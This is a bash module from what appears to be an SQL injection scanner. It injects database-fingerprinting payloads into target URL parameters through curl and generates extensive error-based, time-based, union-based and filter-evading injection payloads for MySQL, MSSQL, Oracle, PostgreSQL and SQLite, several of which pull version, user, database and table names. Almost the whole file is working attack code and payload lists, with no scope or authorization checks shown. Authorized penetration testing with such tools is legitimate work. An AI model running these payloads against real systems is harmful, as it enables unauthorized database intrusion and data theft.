#!/bin/bash
# SQLInjectionScanner Payloads Module - Advanced payload management
# This file contains functions for managing and generating various SQL injection payloads

# Source the core module
# shellcheck source=sqli_core.sh
. "./sqli_core.sh"

# ------------------- Payload Management Functions -------------------

# Base payload types
PAYLOAD_TYPES=(
  "Error_Based"
  "Time_Based"
  "Boolean_Based"
  "Union_Based"
  "Stacked_Queries"
  "Stored_Procedure"
  "Second_Order"
  "DNS_Exfiltration"
  "OOB"
  "Comment_Based"
  "Hybrid"
  "WAF_Bypass"
)

# Database-specific payload markers for customization
declare -A DB_MARKERS=(
  ["MySQL"]="@@version|SLEEP|BENCHMARK|USER()|DATABASE()|mysql"
  ["MSSQL"]="@@SERVERNAME|WAITFOR DELAY|master.dbo|sql_variant|sys.dm_|nvarchar"
  ["Oracle"]="FROM DUAL|UTL_HTTP|SYS.DATABASE_NAME|DBMS_|NVL|v$version"
  ["PostgreSQL"]="pg_sleep|current_setting|PG_DATABASE|PG_USER|pg_catalog|postgresql"
  ["SQLite"]="sqlite_master|sqlite_version()"
)

# Function to attempt database type detection
detect_db_type() {
  local url="$1"
  local param_name="$2"
  local db_type="unknown"
  
  log "INFO" "Attempting to detect database type for $url..."
  
  # Test payloads specific to each database type
  local db_detection_payloads=(
    # MySQL
    "'+(SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)+'::MySQL"
    # MSSQL
    "';IF(LEN(@@version)>0) WAITFOR DELAY '0:0:5'--::MSSQL"
    # Oracle
    "'+UNION+SELECT+CASE+WHEN+(SELECT+user+FROM+DUAL)='SYS'+THEN+'SYS'+ELSE+'OTHER'+END+FROM+DUAL--::Oracle"
    # PostgreSQL
    "';SELECT+pg_sleep(5)--::PostgreSQL"
    # SQLite
    "'+UNION+SELECT+sqlite_version()--::SQLite"
  )
  
  for payload in "${db_detection_payloads[@]}"; do
    # Extract the DB type from the payload
    payload_db="${payload##*::}"
    payload="${payload%%::*}"
    
    # Construct test URL
    log "VERBOSE" "Testing for $payload_db with payload: $payload"
    encoded_payload=$(encode_payload "$payload")
    test_url="${url%\?*}?$( sed -E "s/([?&]${param_name}=)[^&]*/\1${encoded_payload}/" <<< "${url#*\?}" )"
    
    # Test the URL
    start_time=$(date +%s.%N)
    response=$(curl -s -L -m 15 "$test_url" -A "$USER_AGENT")
    end_time=$(date +%s.%N)
    elapsed=$(echo "$end_time - $start_time" | bc)
    
    # Check response for database signatures
    if [[ "$payload_db" == "MySQL" ]] && [[ "$response" =~ (SQL syntax|mysql|MariaDB|MySQLSyntaxErrorException) ]]; then
      db_type="MySQL"
      break
    elif [[ "$payload_db" == "MSSQL" ]] && [[ "$response" =~ (SQL Server|ODBC|OLE DB|sqlserver|Procedure or function|Unclosed quotation mark) ]]; then
      db_type="MSSQL"
      break
    elif [[ "$payload_db" == "Oracle" ]] && [[ "$response" =~ (ORA-|Oracle|quoted string|PL\/SQL|SQL command not properly ended) ]]; then
      db_type="Oracle"
      break
    elif [[ "$payload_db" == "PostgreSQL" ]] && [[ "$response" =~ (PostgreSQL|Npgsql|syntax error at end of input|pg_|column .+ does not exist) ]]; then
      db_type="PostgreSQL"
      break
    elif [[ "$payload_db" == "PostgreSQL" ]] && (( $(echo "$elapsed >= 4.5" | bc -l) )); then
      # Time-based detection for PostgreSQL
      db_type="PostgreSQL"
      break
    elif [[ "$payload_db" == "MSSQL" ]] && (( $(echo "$elapsed >= 4.5" | bc -l) )); then
      # Time-based detection for MSSQL
      db_type="MSSQL"
      break
    elif [[ "$payload_db" == "SQLite" ]] && [[ "$response" =~ (SQLite|sqlite_|Error: near) ]]; then
      db_type="SQLite"
      break
    fi
  done
  
  log "INFO" "Database detection result: $db_type"
  echo "$db_type"
}

# Function to load payloads with customization
load_payloads_enhanced() {
  local type="$1"
  local db_type="$2"
  local output_file="${OUTPUT_DIR}/custom_payloads_${type}.txt"
  local base_payload_file="Payloads/${type}_SQLi_Payloads.txt"
  local payload_count=0
  
  log "INFO" "Loading enhanced payloads for type: $type (DB: $db_type)..."
  
  # Check if the base payload file exists
  if [[ ! -f "$base_payload_file" ]]; then
    log "ERROR" "Payload file not found: $base_payload_file"
    # Return default fallback payloads
    case "$type" in
      "Error_Based")
        echo "'"
        echo "'OR 1=1 -- "
        echo "\" OR 1=1 -- "
        echo "' OR '1'='1"
        ;;
      "Time_Based")
        echo "' OR SLEEP(5) -- "
        echo "1' AND SLEEP(5) #"
        echo "\" AND SLEEP(5) -- "
        ;;
      *)
        echo "'"
        ;;
    esac
    return
  fi
  
  # Start generating enhanced payloads
  {
    echo "# Enhanced $type SQL Injection Payloads"
    echo "# Generated for database type: $db_type"
    echo "# Generated on: $(date)"
    echo ""
    
    # Read and process each payload from the base file
    while IFS= read -r payload; do
      # Skip comments and empty lines
      [[ "$payload" =~ ^#.*$ || -z "$payload" ]] && continue
      
      # Add the base payload
      echo "$payload"
      payload_count=$((payload_count+1))
      
      # Generate variations based on payload type and DB type
      if [[ "$type" == "Time_Based" && "$db_type" != "unknown" ]]; then
        case "$db_type" in
          "MySQL")
            echo "${payload//SLEEP\([0-9]\)/SLEEP(5)}"
            echo "${payload//SLEEP/BENCHMARK(3000000,MD5(1))}"
            payload_count=$((payload_count+2))
            ;;
          "MSSQL")
            echo "${payload//SLEEP\([0-9]\)/WAITFOR DELAY '0:0:5'}"
            payload_count=$((payload_count+1))
            ;;
          "PostgreSQL")
            echo "${payload//SLEEP\([0-9]\)/pg_sleep(5)}"
            payload_count=$((payload_count+1))
            ;;
          "Oracle")
            echo "${payload//SLEEP\([0-9]\)/DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)}"
            payload_count=$((payload_count+1))
            ;;
        esac
      elif [[ "$type" == "Union_Based" && "$db_type" != "unknown" ]]; then
        case "$db_type" in
          "MySQL")
            if [[ "$payload" == *"UNION SELECT"* ]]; then
              echo "${payload} FROM information_schema.tables"
              echo "${payload//UNION SELECT//*!50000UniON*/ /*!50000SeLeCt*/}"
              payload_count=$((payload_count+2))
            fi
            ;;
          "MSSQL")
            if [[ "$payload" == *"UNION SELECT"* ]]; then
              echo "${payload} FROM sysobjects"
              echo "${payload//UNION SELECT/UNION ALL SELECT}"
              payload_count=$((payload_count+2))
            fi
            ;;
          "PostgreSQL")
            if [[ "$payload" == *"UNION SELECT"* ]]; then
              echo "${payload} FROM pg_catalog.pg_tables"
              payload_count=$((payload_count+1))
            fi
            ;;
        esac
      elif [[ "$type" == "Boolean_Based" && "$db_type" != "unknown" ]]; then
        case "$db_type" in
          "MySQL")
            echo "${payload//AND 1=1/AND (SELECT 1)=1}"
            echo "${payload//1=1/BINARY 1=1}"
            payload_count=$((payload_count+2))
            ;;
          "MSSQL")
            echo "${payload//AND 1=1/AND 'a'='a'}"
            payload_count=$((payload_count+1))
            ;;
        esac
      fi
    done < "$base_payload_file"
    
    # Add generic database-specific payloads if not many were generated
    if [[ $payload_count -lt 10 && "$db_type" != "unknown" ]]; then
      log "INFO" "Adding database-specific payloads for $db_type"
      
      case "$db_type" in
        "MySQL")
          if [[ "$type" == "Error_Based" ]]; then
            echo "' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- "
            echo "' AND extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e)) -- "
            echo "' AND updatexml(rand(),concat(0x7e,(SELECT version()),0x7e),null) -- "
          elif [[ "$type" == "Union_Based" ]]; then
            echo "' UNION SELECT 1,2,3,4,@@version -- "
            echo "' UNION SELECT 1,2,3,4,user() -- "
            echo "' UNION SELECT 1,2,3,4,database() -- "
            echo "' UNION SELECT 1,2,3,4,table_name FROM information_schema.tables -- "
          fi
          ;;
        "MSSQL")
          if [[ "$type" == "Error_Based" ]]; then
            echo "' AND 1=(SELECT CONVERT(int,@@version)) -- "
            echo "' AND 1=(SELECT 1/0) -- "
          elif [[ "$type" == "Union_Based" ]]; then
            echo "' UNION SELECT 1,2,3,4,@@VERSION -- "
            echo "' UNION SELECT 1,2,3,4,DB_NAME() -- "
            echo "' UNION SELECT 1,2,3,4,name FROM sysobjects WHERE type='U' -- "
          fi
          ;;
        "PostgreSQL")
          if [[ "$type" == "Error_Based" ]]; then
            echo "' AND 1=cast(current_setting('server_version') as integer) -- "
            echo "' AND 1=(SELECT 1 FROM generate_series(1,1000000)) -- "
          elif [[ "$type" == "Union_Based" ]]; then
            echo "' UNION SELECT 1,2,3,4,current_database() -- "
            echo "' UNION SELECT 1,2,3,4,current_user -- "
            echo "' UNION SELECT 1,2,3,4,tablename FROM pg_tables -- "
          fi
          ;;
      esac
    fi
  } > "$output_file"
  
  log "INFO" "Generated enhanced payloads: $payload_count"
  cat "$output_file"
}

# Function to generate a unique vulnerability ID
generate_vuln_id() {
  local url="$1"
  local param="$2"
  local vuln_type="$3"
  
  # Create a hash of the URL + param + type
  local hash=$(echo -n "${url}${param}${vuln_type}" | md5sum | cut -d' ' -f1 | tr -d '\n')
  local timestamp=$(date '+%Y%m%d%H%M%S')
  
  # Return ID
  echo "VULN_${timestamp}_${hash:0:8}"
}

# Function to generate a comprehensive list of payloads for all supported databases
generate_all_payloads() {
  local output_dir="${OUTPUT_DIR}/payloads"
  
  # Create directory for generated payloads
  mkdir -p "$output_dir"
  
  log "INFO" "Generating comprehensive payloads for all database types..."
  
  # Generate for each type and DB combination
  for type in "${PAYLOAD_TYPES[@]}"; do
    for db in "MySQL" "MSSQL" "Oracle" "PostgreSQL" "SQLite"; do
      local output_file="${output_dir}/${type}_${db}.txt"
      
      log "VERBOSE" "Generating $type payloads for $db..."
      
      {
        echo "# $type SQL Injection Payloads for $db"
        echo "# Generated on: $(date)"
        echo "# Auto-generated by SQLInjectionScanner"
        echo ""
        
        # Base payloads
        case "$type" in
          "Error_Based")
            echo "'"
            echo "\""
            echo "1'"
            echo "1\""
            
            # DB-specific
            case "$db" in
              "MySQL")
                echo "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(0x7e,(SELECT @@version),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) -- "
                echo "' AND extractvalue(rand(),concat(0x7e,(SELECT version()),0x7e)) -- "
                echo "' AND updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1) -- "
                echo "' AND ROW(1,2)>(SELECT COUNT(*),CONCAT(CONCAT('~',@@version,'~'),FLOOR(RAND(0)*2)) FROM information_schema.tables GROUP BY CONCAT(CONCAT('~',@@version,'~'),FLOOR(RAND(0)*2))) -- "
                ;;
              "MSSQL")
                echo "' AND 1=(SELECT CONVERT(int,@@version)) -- "
                echo "' AND 1=(SELECT 1/0) -- "
                echo "';DECLARE @q varchar(8000);SET @q=CONVERT(varchar(8000),(SELECT @@version));EXEC(@q); -- "
                echo "' AND 1 IN (SELECT TOP 1 CAST(name as varchar(500)) FROM sysobjects) -- "
                ;;
              "Oracle")
                echo "' AND 1=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||USER||CHR(62))) FROM dual) -- "
                echo "' AND 1=CTXSYS.DRITHSX.SN(1,(SELECT banner FROM v$version WHERE ROWNUM=1)) -- "
                echo "' AND 1=UTL_INADDR.GET_HOST_NAME((SELECT banner FROM v$version WHERE ROWNUM=1)) -- "
                ;;
              "PostgreSQL")
                echo "' AND 1=cast(version() as numeric) -- "
                echo "' AND 1=(SELECT 1 FROM pg_sleep(0)::text) -- "
                echo "' AND 1=(SELECT 1 FROM pg_type LIMIT 1) -- "
                ;;
              "SQLite")
                echo "' AND 1=RANDOMBLOB(500000000) -- "
                echo "' AND 1=(SELECT load_extension(0x4141414141414141)) -- "
                echo "' AND 1=(SELECT 1 FROM sqlite_master) -- "
                ;;
            esac
            ;;
          
          "Time_Based")
            # DB-specific time-based
            case "$db" in
              "MySQL")
                echo "' AND (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
                echo "' OR (SELECT * FROM (SELECT(SLEEP(5)))a) -- "
                echo "' AND SLEEP(5) -- "
                echo "' OR SLEEP(5) -- "
                echo "' AND BENCHMARK(50000000,MD5('A')) -- "
                echo "' OR BENCHMARK(50000000,MD5('A')) -- "
                echo "1' AND SLEEP(5) AND '1'='1"
                echo "1' OR SLEEP(5) AND '1'='1"
                ;;
              "MSSQL")
                echo "' WAITFOR DELAY '0:0:5' -- "
                echo "' AND WAITFOR DELAY '0:0:5' -- "
                echo "' OR WAITFOR DELAY '0:0:5' -- "
                echo "1'; WAITFOR DELAY '0:0:5' -- "
                echo "1' AND 1 IN (SELECT COUNT(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers as sys4, sysusers as sys5, sysusers as sys6, sysusers as sys7) -- "
                ;;
              "Oracle")
                echo "' AND DBMS_PIPE.RECEIVE_MESSAGE(('A'),5) -- "
                echo "' OR DBMS_PIPE.RECEIVE_MESSAGE(('A'),5) -- "
                echo "' AND 1=UTL_INADDR.GET_HOST_ADDRESS('10.0.0.1') -- "
                echo "' BEGIN DBMS_LOCK.SLEEP(5); END; -- "
                ;;
              "PostgreSQL")
                echo "' AND (SELECT pg_sleep(5)) -- "
                echo "' OR (SELECT pg_sleep(5)) -- "
                echo "' AND 1=(SELECT 1 FROM generate_series(1,1000000)) -- "
                echo "1'; SELECT pg_sleep(5) -- "
                ;;
              "SQLite")
                echo "' AND RANDOMBLOB(100000000) -- "
                echo "' OR RANDOMBLOB(100000000) -- "
                echo "1' AND sqlite3_version(); -- "
                ;;
            esac
            ;;
          
          "Union_Based")
            # Generate union-based with column variations
            for i in {1..10}; do
              # Create NULL value string for this number of columns
              nulls=""
              for ((j=1; j<=$i; j++)); do
                [[ $j -gt 1 ]] && nulls+=","
                nulls+="NULL"
              done
              
              # Create numbered column string (1,2,3,...)
              nums=""
              for ((j=1; j<=$i; j++)); do
                [[ $j -gt 1 ]] && nums+=","
                nums+="$j"
              done
              
              echo "' UNION SELECT $nulls -- "
              echo "' UNION ALL SELECT $nulls -- "
              echo "' UNION SELECT $nums -- "
              
              # DB-specific union injections
              case "$db" in
                "MySQL")
                  # Version on the last column
                  version_cols="$nulls"
                  version_cols="${version_cols/%NULL/@@version}"
                  echo "' UNION SELECT $version_cols -- "
                  
                  # User on the last column
                  user_cols="$nulls"
                  user_cols="${user_cols/%NULL/user()}"
                  echo "' UNION SELECT $user_cols -- "
                  
                  # Database name on the last column
                  db_cols="$nulls"
                  db_cols="${db_cols/%NULL/database()}"
                  echo "' UNION SELECT $db_cols -- "
                  ;;
                "MSSQL")
                  # Version on the last column
                  version_cols="$nulls"
                  version_cols="${version_cols/%NULL/@@VERSION}"
                  echo "' UNION SELECT $version_cols -- "
                  
                  # User on the last column
                  user_cols="$nulls"
                  user_cols="${user_cols/%NULL/user_name()}"
                  echo "' UNION SELECT $user_cols -- "
                  
                  # Database name on the last column
                  db_cols="$nulls"
                  db_cols="${db_cols/%NULL/DB_NAME()}"
                  echo "' UNION SELECT $db_cols -- "
                  ;;
                "PostgreSQL")
                  # Version on the last column
                  version_cols="$nulls"
                  version_cols="${version_cols/%NULL/version()}"
                  echo "' UNION SELECT $version_cols -- "
                  
                  # User on the last column
                  user_cols="$nulls"
                  user_cols="${user_cols/%NULL/current_user}"
                  echo "' UNION SELECT $user_cols -- "
                  
                  # Database name on the last column
                  db_cols="$nulls"
                  db_cols="${db_cols/%NULL/current_database()}"
                  echo "' UNION SELECT $db_cols -- "
                  ;;
              esac
            done
            ;;
          
          # Add other payload types as needed
        esac
      } > "$output_file"
    done
  done
  
  log "INFO" "Payload generation complete. Files saved in $output_dir"
  return 0
}

# Export payload management functions
export -f detect_db_type
export -f load_payloads_enhanced
export -f generate_vuln_id
export -f generate_all_payloads
export PAYLOAD_TYPES
export DB_MARKERS 